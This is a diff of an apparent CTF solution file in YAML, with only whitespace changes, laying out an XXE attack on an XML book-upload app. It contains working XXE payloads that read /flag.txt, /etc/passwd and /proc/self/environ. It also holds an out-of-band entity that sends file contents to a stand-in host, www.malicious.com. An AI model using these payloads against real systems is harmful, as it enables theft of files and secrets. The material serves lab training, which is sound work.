@@ -16,13 +16,13 @@ tricks:
     payload: |
       # py line 21:
       # parser = etree.XMLParser(no_network=False,resolve_entities=True)
-      # 
+      #
       # Vulnerability indicators:
       # - resolve_entities=True: Allows external entity resolution
       # - no_network=False: Allows network access for external entities
       # - User input directly passed to etree.fromstring() (line 23)
       # - No validation or sanitization of XML input
-      # 
+      #
       # This configuration allows XXE attacks to read local files
 
   - name: "Step 2: Craft XXE payload"
@@ -40,7 +40,7 @@ tricks:
           <Editor>Test Editor</Editor>
           <Publisher>Test Publisher</Publisher>
       </Book>
-      # 
+      #
       # Explanation:
       # - DOCTYPE defines an external entity named "xxe"
       # - SYSTEM "file:///flag.txt" points to the flag file
@@ -61,7 +61,7 @@ tricks:
           <Title>Test</Title>
           <ISBN>&xxe;</ISBN>
       </Book>
-      # 
+      #
       # The application:
       # 1. Receives XML in request.form['xml']
       # 2. Creates parser with resolve_entities=True
@@ -76,18 +76,18 @@ tricks:
       # Response structure (result.html):
       # - msg: "You have append this book successfully !"
       # - parsed_xml: The parsed XML with injected file content
-      # 
+      #
       # Flag extraction:
       # 1. Flag appears in the parsed XML output
       # 2. Usually in the ISBN field (where &xxe; was placed)
       # 3. Use regex to extract: FLAG\{[^}]+\}
-      # 
+      #
       # Example Python extraction:
       # import re
       # flag_match = re.search(r'FLAG\{[^}]+\}', resp.text, re.IGNORECASE)
       # if flag_match:
       #     flag = flag_match.group(0)
-      # 
+      #
       # Note: Flag file location: /flag.txt (created in Dockerfile)
 
   - name: "Alternative: Read other files"
@@ -98,7 +98,7 @@ tricks:
       <!ENTITY xxe SYSTEM "file:///etc/passwd">
       <!ENTITY xxe SYSTEM "file:///app/py">
       <!ENTITY xxe SYSTEM "file:///proc/self/environ">
-      # 
+      #
       # Note: file:// protocol for local files
       # For network resources: http://, ftp://, etc.
 
@@ -111,13 +111,12 @@ tricks:
       <!ENTITY % xxe SYSTEM "file:///flag.txt">
       <!ENTITY callhome SYSTEM "www.malicious.com/?%xxe;">
       ]>
-      # 
+      #
       # Method 2: Use CDATA wrapper (if needed)
       <!ENTITY xxe SYSTEM "file:///flag.txt">
       <ISBN><![CDATA[&xxe;]]></ISBN>
-      # 
+      #
       # Method 3: Try different file paths
       file:///flag.txt
       file:///app/flag.txt
       file://flag.txt
-
